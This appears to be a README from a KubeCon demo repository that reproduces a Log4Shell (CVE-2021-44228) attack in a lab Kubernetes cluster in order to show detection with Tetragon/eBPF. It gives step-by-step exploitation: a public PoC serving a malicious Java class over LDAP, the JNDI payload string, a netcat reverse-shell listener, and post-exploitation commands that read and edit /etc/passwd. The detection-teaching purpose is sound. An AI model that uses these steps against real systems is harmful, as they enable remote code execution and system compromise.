# The Next Log4jshell?! Preparing for CVEs with eBPF!

This repository contains the demo and the corresponding instructions that was presented at KubeCon 
2023 EU, Amsterdam during the `The Next Log4jshell?! Preparing for CVEs with eBPF!` presentation.

## Environment

Create a one node Ubuntu cluster:
```bash
gcloud container clusters create "${NAME}" \
  --zone europe-central2-a \
  --image-type ubuntu_containerd \
  --num-nodes 1
```

Check if the cluster is up:
```bash
kubectl get nodes -o wide
NAME                                                  STATUS   ROLES    AGE   VERSION            INTERNAL-IP   EXTERNAL-IP      OS-IMAGE             KERNEL-VERSION    CONTAINER-RUNTIME
gke-log4shell-natalia-te-default-pool-5a672e2f-gkjd   Ready    <none>   81s   v1.25.7-gke.1000   10.186.0.46   34.116.193.142   Ubuntu 22.04.2 LTS   5.15.0-1028-gke   containerd://1.6.12
```

Deploy Tetragon:
```bash
helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon -n kube-system -f tetragon.yaml
```

Check if Tetragon is running:
```bash
kubectl get pods -n kube-system
NAME                                                             READY   STATUS    RESTARTS   AGE
...
hubble-enterprise-zw77t                                          2/2     Running   0          3m21s
...
```

### Setup Log4shell exploit

SSH into the Ubuntu VM (K8s node):
```bash
gcloud compute ssh --zone "europe-central2-a" "gke-log4shell-natalia-te-default-pool-5a672e2f-gkjd" --project "cilium-dev"
natalia@gke-log4shell-natalia-te-default-pool-5a672e2f-gkjd:
```

Clone the PoC Log4shell repository (where the code for the exploit is):
```bash
git clone https://github.com/kozmer/log4j-shell-poc.git
```

Install pip3:
```bash
sudo apt update
sudo apt install python3-pip
```

Install requirements:
```bash
pip install -r requirements.txt
Defaulting to user installation because normal site-packages is not writeable
Collecting colorama
  Downloading colorama-0.4.6-py2.py3-none-any.whl (25 kB)
Collecting argparse
  Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Installing collected packages: argparse, colorama
Successfully installed argparse-1.4.0 colorama-0.4.6
```

Copy the vulnerable Java version to the Ubuntu VM from a different terminal:
```bash
gcloud compute scp ./jdk-8u201-linux-x64.tar.gz gke-log4shell-natalia-te-default-pool-5a672e2f-gkjd:/home/natalia
```

Extract the `tar.gz` file:
```bash
tar -xzvf jdk-8u201-linux-x64.tar.gz
```

Rename the vulnerable java version to the appropriate filename that the exploit can use:
```bash
mv jdk1.8.0_201/ jdk1.8.0_20
```

Copy it into the directory:
```bash
cp -r jdk1.8.0_20/ log4j-shell-poc/
```

## Log4jshell Exploitation Demo

You would need 3 terminal for this exploit and a web browser open.

[Terminal 1] Start vulnerable java web application on the `tenant-jobs` namespace. 
```bash
kubectl apply -f webapp-pod.yaml -n tenant-jobs
```

[Terminal 1] Wait until it starts:
```bash
kubectl get pods -n tenant-jobs -o wide
```

The web application is running with access to the host network namespace, so we can use the Ubuntu
VM external IP to open it from the web browser. 

[Web Browser] If we open the web browser and type `<external_ip>:8080`, in my case it's `http://34.118.100.209:8080/`,
then we should be able to see the Login page of the vulnerable application:

![Screenshot](log4j_login.png)

SSH into the Ubuntu VM node with 2 terminals:
Terminal 2: to setup the LDAP server (which contains the malicious java class)
Terminal 3: to start the netcat listener (which will receive the reverse shell)

```bash
gcloud compute ssh --zone "europe-central2-a" "gke-logj4-kubecon-2023-default-pool-3f2550a2-m8tm" --project "cilium-dev"
```

[Terminal 2] Start the POC exploit, that creates the malicious java class and sets up an 
LDAP server which will listen on port `1389`.
```bash
cd log4j-shell-poc/
sudo python3 poc.py --userip localhost --webport 8000 --lport 9001
```

[Terminal 2] The output should be something like this:
```bash
[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}
[+] Starting Webserver on port 8000 http://0.0.0.0:8000

Listening on 0.0.0.0:1389
```

[Terminal 3] Run the `netcat` listener that listens on port `9001` and accepts the reverse shell
connection:
```bash
nc -lvnp 9001
```

[Terminal 3] The output should be something like this:
```bash
Listening on 0.0.0.0 9001
```

[Terminal 1] Start to observe the events from Tetragon:
```bash
kubectl exec -it -n kube-system hubble-enterprise-r495v -c enterprise -- /bin/bash
hubble-enterprise getevents -o compact --pod java-webapp
```

[Web Browser] Paste the created JNDI lookup string `${jndi:ldap://localhost:1389/a}` to either the username or
password field of the web application, then click on `Login`:

![Screenshot](log4j_malicious_string.png)

[Terminal 2] You should see that the JNDI lookup actually connected to the LDAP, server and downloaded the
malicious `Exploit.class` Java class:

```bash
Send LDAP reference result for a redirecting to http://localhost:8000/Exploit.class
127.0.0.1 - - [04/Mar/2023 15:19:05] "GET /Exploit.class HTTP/1.1" 200 -
```

[Terminal 3] which then sent the reverse shell to the netcat listener:
```bash
root@scale-2023-log4j-ebpf-vm:/home/natalia# nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 127.0.0.1 53566
```

[Terminal 1] Observe the events from Tetragon:
```bash
💡 accept  tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 84.224.132.87:55109 => 10.186.0.8:8080 🛑 CAP_SYS_ADMIN
💡 accept  tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 84.224.132.87:55110 => 10.186.0.8:8080 🛑 CAP_SYS_ADMIN
💡 accept  tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 84.224.132.87:55112 => 10.186.0.8:8080 🛑 CAP_SYS_ADMIN
🧹 close   tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 127.0.0.1:40616 => 127.0.0.1:8000 tx 210 B rx 1.6 kB 🛑 CAP_SYS_ADMIN
🧮 socket  tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 127.0.0.1:40616 => 127.0.0.1:8000 tx 210 B rx 1.6 kB
🚀 process tenant-jobs/java-webapp /bin/sh                 🛑 CAP_SYS_ADMIN
🧹 close   tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 10.186.0.8:8080 => 84.224.132.87:55112 tx 0 B rx 0 B 🛑 CAP_SYS_ADMIN
🧮 socket  tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 10.186.0.8:8080 => 84.224.132.87:55112 tx 0 B rx 0 B
```
where 
- this is the web application accepting events (when we clicked on Login)
```bash
💡 accept  tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 84.224.132.87:55109 => 10.186.0.8:8080 🛑 CAP_SYS_ADMIN
💡 accept  tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 84.224.132.87:55110 => 10.186.0.8:8080 🛑 CAP_SYS_ADMIN
💡 accept  tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 84.224.132.87:55112 => 10.186.0.8:8080 🛑 CAP_SYS_ADMIN
```
- this is the malicious Java class download file
```bash
🧹 close   tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 127.0.0.1:40616 => 127.0.0.1:8000 tx 210 B rx 1.6 kB 🛑 CAP_SYS_ADMIN
🧮 socket  tenant-jobs/java-webapp /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java TCP 127.0.0.1:40616 => 127.0.0.1:8000 tx 210 B rx 1.6 kB
```
- this is the reverse shell executed:
```bash
🚀 process tenant-jobs/java-webapp /bin/sh                 🛑 CAP_SYS_ADMIN
```

[Terminal 3] As a verification we can list the files in the current directory, so we can see that 
we are inside the web application pod:
```
pwd
/usr/local/tomcat
ls -l
total 124
-rw-r--r-- 1 root root  57011 Jun  9  2016 LICENSE
-rw-r--r-- 1 root root   1444 Jun  9  2016 NOTICE
-rw-r--r-- 1 root root   6739 Jun  9  2016 RELEASE-NOTES
-rw-r--r-- 1 root root  16195 Jun  9  2016 RUNNING.txt
drwxr-xr-x 2 root root   4096 Aug 31  2016 bin
drwxr-xr-x 1 root root   4096 Mar  4 10:21 conf
drwxr-sr-x 3 root staff  4096 Aug 31  2016 include
drwxr-xr-x 2 root root   4096 Aug 31  2016 lib
drwxr-xr-x 1 root root   4096 Mar  4 10:21 logs
drwxr-sr-x 3 root staff  4096 Aug 31  2016 native-jni-lib
drwxr-xr-x 2 root root   4096 Aug 31  2016 temp
drwxr-xr-x 1 root root   4096 Mar  4 10:21 webapps
drwxr-xr-x 1 root root   4096 Mar  4 10:21 work
```

[Terminal 1] Observe the events from Tetragon:
```bash
🚀 process tenant-jobs/java-webapp  /bin/ls -l           🛑 CAP_SYS_ADMIN
📬 open    tenant-jobs/java-webapp  /bin/ls /etc/passwd  🛑 CAP_SYS_ADMIN
📪 close   tenant-jobs/java-webapp  /bin/ls              🛑 CAP_SYS_ADMIN
💥 exit    tenant-jobs/java-webapp  /bin/ls -l 0         🛑 CAP_SYS_ADMIN
```

[Terminal 3] Execute some example commands from the reverse shell:
```bash
env
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:107::/var/run/dbus:/bin/false
```

[Terminal 1] Observe the events from Tetragon:
```bash
🚀 process tenant-jobs/java-webapp /usr/bin/env            🛑 CAP_SYS_ADMIN
💥 exit    tenant-jobs/java-webapp /usr/bin/env  0 🛑 CAP_SYS_ADMIN
🚀 process tenant-jobs/java-webapp /bin/cat /etc/passwd    🛑 CAP_SYS_ADMIN
📬 open    tenant-jobs/java-webapp /bin/cat /etc/passwd    🛑 CAP_SYS_ADMIN
📪 close   tenant-jobs/java-webapp /bin/cat                         🛑 CAP_SYS_ADMIN
💥 exit    tenant-jobs/java-webapp /bin/cat /etc/passwd 0 🛑 CAP_SYS_ADMIN
```

[Terminal 3] Edit `/etc/passwd`:
```bash
vi /etc/passwd
# add a username
```

[Terminal 1] Observe the events from Tetragon:
```bash
🚀 process  tenant-jobs/java-webapp /usr/bin/vi /etc/passwd 🛑 CAP_SYS_ADMIN
📬 open     tenant-jobs/java-webapp /usr/bin/vi /etc/passwd 🛑 CAP_SYS_ADMIN
📪 close    tenant-jobs/java-webapp /usr/bin/vi  🛑 CAP_SYS_ADMIN
📬 open     tenant-jobs/java-webapp /usr/bin/vi /etc/passwd 🛑 CAP_SYS_ADMIN
📪 close    tenant-jobs/java-webapp /usr/bin/vi  🛑 CAP_SYS_ADMIN
📬 open     tenant-jobs/java-webapp /usr/bin/vi /etc/passwd 🛑 CAP_SYS_ADMIN
📪 close    tenant-jobs/java-webapp /usr/bin/vi 🛑 CAP_SYS_ADMIN
📬 open     tenant-jobs/java-webapp /usr/bin/vi /etc/passwd 🛑 CAP_SYS_ADMIN
📝 write    tenant-jobs/java-webapp /usr/bin/vi /etc/passwd 1253 bytes 🛑 CAP_SYS_ADMIN
📪 close    tenant-jobs/java-webapp /usr/bin/vi 🛑 CAP_SYS_ADMIN
💥 exit     tenant-jobs/java-webapp /usr/bin/vi /etc/passwd 0 🛑 CAP_SYS_ADMIN
```
